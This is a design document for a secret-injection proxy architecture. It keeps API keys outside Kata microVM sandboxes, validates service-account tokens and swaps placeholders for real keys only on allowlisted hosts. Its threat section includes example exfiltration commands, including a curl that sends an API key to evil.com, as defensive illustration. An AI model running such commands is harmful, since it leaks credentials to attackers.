# Secret Proxy Architecture

A two-tier proxy architecture that securely injects API keys into SDK requests while preventing exfiltration from sandboxes.

**Key principle:** Real secrets NEVER enter the sandbox microVM. They are injected by an external proxy only when authorized.

Inspired by [Deno Sandbox](https://deno.com/blog/introducing-deno-sandbox).

## Architecture Overview

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                           KATA MICROVM (Sandbox)                            │
│                                                                             │
│  ┌─────────┐    HTTP_PROXY     ┌─────────────┐                              │
│  │   SDK   │ ───────────────── │ auth-proxy  │                              │
│  │ (Claude)│   localhost:8080  │  :8080      │                              │
│  └─────────┘                   └──────┬──────┘                              │
│       │                               │                                     │
│       │ ANTHROPIC_API_KEY=            │ Adds header:                        │
│       │ NETCLODE_PLACEHOLDER_anthropic│ Proxy-Authorization: Bearer <token> │
│       │                               │                                     │
│       │ (NO real secrets here)        │ Token from: /var/run/secrets/       │
│       │                               │             proxy-auth/token        │
└───────┼───────────────────────────────┼─────────────────────────────────────┘
        │                               │
        │                               ▼
        │               ┌───────────────────────────────┐
        │               │     secret-proxy Service      │
        │               │   (OUTSIDE the microVM)       │
        │               │                               │
        │               │  1. Extract token from header │
        │               │  2. Validate with ctrl-plane  │
        │               │  3. Get allowed secret key    │
        │               │  4. Replace placeholder with  │
        │               │     real secret in headers    │
        │               │  5. Forward to internet       │
        │               │                               │
        │               │  HAS real secrets in memory   │
        │               └───────────────┬───────────────┘
        │                               │
        │                               ▼
        │                       ┌───────────────┐
        │                       │   Internet    │
        │                       │ (Anthropic,   │
        │                       │  OpenAI, etc) │
        │                       └───────────────┘
```

## Components

### auth-proxy (inside sandbox)

A tiny Go proxy that runs inside the Kata microVM at `localhost:8080`.

**Responsibilities:**
- Reads Kubernetes ServiceAccount token from mounted volume
- Adds `Proxy-Authorization: Bearer <token>` header to all requests
- Forwards to external secret-proxy
- **HAS NO SECRETS** - only the SA token for authentication

**Location:** [`services/agent/auth-proxy/`](../services/agent/auth-proxy/)

### secret-proxy (outside sandbox)

A MITM proxy that runs as a Kubernetes Deployment outside the microVM.

**Responsibilities:**
- Receives requests with SA token in `Proxy-Authorization` header
- Validates token with control-plane (checks session → SDK type → allowed hosts)
- Performs HTTPS MITM to intercept encrypted traffic
- Replaces placeholder values with real secrets **in headers only**
- Forwards requests to the internet

**Location:** [`services/secret-proxy/`](../services/secret-proxy/)

### control-plane validation

The control-plane provides the `/internal/validate-proxy-auth` endpoint:

```
POST /internal/validate-proxy-auth
{
  "token": "eyJhbGciOiJSUzI1NiIs...",
  "target_host": "api.anthropic.com"
}

Response:
{
  "allowed": true,
  "secret_key": "anthropic",
  "placeholder": "NETCLODE_PLACEHOLDER_anthropic",
  "session_id": "session-xyz789"
}
```

Validation flow:
1. Verify SA token via Kubernetes TokenReview API → get pod name
2. Look up session by pod name
3. Get session's SDK type
4. Check if target host is allowed for that SDK type
5. Return which secret key to inject

## Request Flow

```
┌──────────────────────────────────────────────────────────────────────────────────┐
│ STEP 1: SDK makes API request                                                    │
├──────────────────────────────────────────────────────────────────────────────────┤
│                                                                                  │
│  Claude SDK inside sandbox:                                                      │
│                                                                                  │
│    POST https://api.anthropic.com/v1/messages                                    │
│    x-api-key: NETCLODE_PLACEHOLDER_anthropic    ◄── Placeholder, not real key   │
│    Content-Type: application/json                                                │
│                                                                                  │
│  Environment:                                                                    │
│    HTTPS_PROXY=http://127.0.0.1:8080                                             │
│    ANTHROPIC_API_KEY=NETCLODE_PLACEHOLDER_anthropic                              │
│                                                                                  │
└──────────────────────────────────────────────────────────────────────────────────┘
                                       │
                                       ▼
┌──────────────────────────────────────────────────────────────────────────────────┐
│ STEP 2: auth-proxy adds ServiceAccount token                                     │
├──────────────────────────────────────────────────────────────────────────────────┤
│                                                                                  │
│  auth-proxy (localhost:8080) receives CONNECT request:                           │
│                                                                                  │
│    CONNECT api.anthropic.com:443 HTTP/1.1                                        │
│    Host: api.anthropic.com:443                                                   │
│                                                                                  │
│  Reads token from /var/run/secrets/proxy-auth/token                              │
│  Forwards to upstream with auth header:                                          │
│                                                                                  │
│    CONNECT api.anthropic.com:443 HTTP/1.1                                        │
│    Host: api.anthropic.com:443                                                   │
│    Proxy-Authorization: Bearer eyJhbGciOiJSUzI1NiIs...  ◄── K8s SA token         │
│                                                                                  │
│  Upstream: http://secret-proxy.netclode.svc.cluster.local:8080                   │
│                                                                                  │
└──────────────────────────────────────────────────────────────────────────────────┘
                                       │
                                       ▼
┌──────────────────────────────────────────────────────────────────────────────────┐
│ STEP 3: secret-proxy validates token with control-plane                          │
├──────────────────────────────────────────────────────────────────────────────────┤
│                                                                                  │
│  secret-proxy extracts token, calls control-plane:                               │
│                                                                                  │
│    POST http://control-plane-internal.netclode.svc:3002/internal/validate-proxy-auth │
│    {                                                                             │
│      "token": "eyJhbGciOiJSUzI1NiIs...",                                         │
│      "target_host": "api.anthropic.com"                                          │
│    }                                                                             │
│                                                                                  │
└──────────────────────────────────────────────────────────────────────────────────┘
                                       │
                                       ▼
┌──────────────────────────────────────────────────────────────────────────────────┐
│ STEP 4: control-plane validates and authorizes                                   │
├──────────────────────────────────────────────────────────────────────────────────┤
│                                                                                  │
│  control-plane.ValidateProxyAuth(token, "api.anthropic.com"):                    │
│                                                                                  │
│    1. VerifyAgentToken(token)                                                    │
│       └── K8s TokenReview API validates signature                                │
│       └── Returns pod name: "sandbox-abc123-0"                                   │
│                                                                                  │
│    2. GetSessionIDByPodName("sandbox-abc123-0")                                  │
│       └── Returns session ID: "session-xyz789"                                   │
│                                                                                  │
│    3. Get session's SDK type: SDK_TYPE_CLAUDE                                    │
│                                                                                  │
│    4. getAllowedSecretForHost(SDK_TYPE_CLAUDE, "api.anthropic.com")              │
│       └── Claude SDK → allowed hosts: [api.anthropic.com]                        │
│       └── Returns: secretKey="anthropic", placeholder="NETCLODE_PLACEHOLDER_..." │
│                                                                                  │
│  Response:                                                                       │
│    {                                                                             │
│      "allowed": true,                                                            │
│      "secret_key": "anthropic",                                                  │
│      "placeholder": "NETCLODE_PLACEHOLDER_anthropic",                            │
│      "session_id": "session-xyz789"                                              │
│    }                                                                             │
│                                                                                  │
└──────────────────────────────────────────────────────────────────────────────────┘
                                       │
                                       ▼
┌──────────────────────────────────────────────────────────────────────────────────┐
│ STEP 5: secret-proxy injects real secret                                         │
├──────────────────────────────────────────────────────────────────────────────────┤
│                                                                                  │
│  secret-proxy establishes HTTPS tunnel, performs MITM:                           │
│                                                                                  │
│  Original request from SDK:                                                      │
│    x-api-key: NETCLODE_PLACEHOLDER_anthropic                                     │
│                                                                                  │
│  After replacement:                                                              │
│    x-api-key: sk-ant-api03-xxxxx...  ◄── Real Anthropic API key                  │
│                                                                                  │
│  Forwards to api.anthropic.com                                                   │
│                                                                                  │
└──────────────────────────────────────────────────────────────────────────────────┘
```

## SDK to Allowed Hosts Mapping

| SDK Type | Allowed Hosts | Secret Key |
|----------|---------------|------------|
| `SDK_TYPE_CLAUDE` | `api.anthropic.com` | `anthropic` |
| `SDK_TYPE_OPENCODE` | `api.anthropic.com` | `anthropic` |
| | `api.openai.com` | `openai` |
| | `api.mistral.ai` | `mistral` |
| | `openrouter.ai`, `api.openrouter.ai` | `opencode` |
| | `api.opencode.ai` | `opencode` |
| | `open.bigmodel.cn` | `zai` |
| `SDK_TYPE_COPILOT` | `api.github.com` | `github_copilot` |
| | `copilot-proxy.githubusercontent.com` | `github_copilot` |
| | `api.anthropic.com` | `anthropic` |
| `SDK_TYPE_CODEX` | `api.openai.com` | `codex_access` |

## Security Analysis

### Threat: Malicious code tries to exfiltrate API keys

**Attack vector 1: Read environment variables**
```bash
$ env | grep API_KEY
ANTHROPIC_API_KEY=NETCLODE_PLACEHOLDER_anthropic
```
Only gets placeholder, not real key.

**Attack vector 2: Send key to attacker-controlled server**
```bash
$ curl -H "x-api-key: $ANTHROPIC_API_KEY" https://evil.com
```
secret-proxy validates target host. `evil.com` not in allowlist → request blocked or placeholder not replaced.

**Attack vector 3: Use Claude session's token for OpenAI**
```
Claude session tries: POST https://api.openai.com/...
```
control-plane checks SDK type: `SDK_TYPE_CLAUDE`. `api.openai.com` not in Claude's allowlist → request denied.

### Security Boundaries

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                                                                                 │
│   UNTRUSTED ZONE (Kata MicroVM)          TRUSTED ZONE (K8s Host)                │
│   ─────────────────────────────          ───────────────────────                │
│                                                                                 │
│   ┌─────────────────────────┐            ┌─────────────────────────┐            │
│   │                         │            │                         │            │
│   │  • User code            │            │  • control-plane        │            │
│   │  • Claude/OpenCode SDK  │            │  • secret-proxy         │            │
│   │  • auth-proxy           │            │  • Real API keys        │            │
│   │                         │            │                         │            │
│   │  NO real secrets        │    ───►    │  Validates every        │            │
│   │  Only placeholders      │            │  request via token      │            │
│   │  Only SA token          │            │                         │            │
│   │                         │            │                         │            │
│   └─────────────────────────┘            └─────────────────────────┘            │
│                                                                                 │
│   Even if attacker gets RCE    │         Secrets only sent to                   │
│   in sandbox, they only see:   │         allowlisted hosts based                │
│   • NETCLODE_PLACEHOLDER_xxx   │         on session's SDK type                  │
│   • SA token (only valid for   │                                                │
│     secret-proxy audience)     │                                                │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

## Deployment

### Kubernetes Resources

1. **secret-proxy Deployment** (`infra/ansible/roles/k8s-manifests/templates/secret-proxy.yaml.j2`)
   - Runs as a Deployment with 1 replica
   - Mounts CA cert/key and secrets.json
   - Exposed via ClusterIP Service

2. **secret-proxy-secrets Secret**
   - Contains `secrets.json` with real API keys
   - Created by Ansible from `.env` file

3. **secret-proxy-ca ConfigMap**
   - Contains CA certificate for MITM (public)
   - Mounted in both secret-proxy and sandboxes

4. **secret-proxy-ca-key Secret**
   - Contains CA private key
   - Mounted only in secret-proxy

5. **Sandbox template** (`infra/k8s/sandbox-template.yaml`)
   - Sets `HTTP_PROXY`/`HTTPS_PROXY` to localhost:8080
   - Mounts projected SA token with `secret-proxy` audience
   - Mounts CA cert for trust
   - Agent entrypoint starts auth-proxy

### NetworkPolicy

Base policy allows:
- `control-plane` (for config/events)
- `secret-proxy` (for API requests)
- DNS (kube-system)
- Public internet access (default)

Private networks and tailnet are blocked by default. See `docs/network-access.md`.

## Troubleshooting

### Check auth-proxy logs

```bash
kubectl --context netclode -n netclode logs <pod> -c agent | grep auth-proxy
```

### Check secret-proxy logs

```bash
kubectl --context netclode -n netclode logs -l app=secret-proxy -f
```

### Verify internal endpoint isolation

```bash
# Sandboxes must not be able to reach the internal control-plane listener.
kubectl --context netclode -n netclode exec <sandbox-pod> -- \
  curl --max-time 2 http://control-plane-internal.netclode.svc:3002/health
# Expected: connection timeout or refusal.
```

### Check if placeholder is being replaced

Look for "Injected secret" in secret-proxy logs:
```
INFO Injected secret secretKey=anthropic targetHost=api.anthropic.com sessionID=session-xyz789
```
